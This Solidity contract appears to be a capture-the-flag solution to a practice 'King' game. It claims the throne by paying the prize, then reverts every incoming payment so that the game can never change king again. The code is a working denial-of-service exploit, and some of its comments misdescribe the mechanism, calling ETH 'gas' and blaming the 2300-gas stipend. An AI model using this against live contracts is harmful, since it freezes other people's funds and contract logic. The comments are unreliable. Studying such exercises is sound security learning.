//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "./King.sol";

contract ForeverKingGxT{

    //I send an amount of gas equal to the current prize to the King contract to become the new king
    constructor(address payable _a) payable{
        uint prize = King(_a).prize();
        (bool success, ) = _a.call{value: prize}("");
        require(success, "txn failed");
    }

    //both fallback methods are set to revert the txn in case they are triggered
    //this way this contract will not be able to receive ETH
    //the transfer() function inside receive() in King contract will fail every time
    //because it will not be able to send the required 2300 gas to this contract
    //this will make the function revert and the king unable to be changed anymore

    receive() external payable{
        revert("No thanks G");
    }

    fallback() external payable{
        revert("No ETH");
    }
}
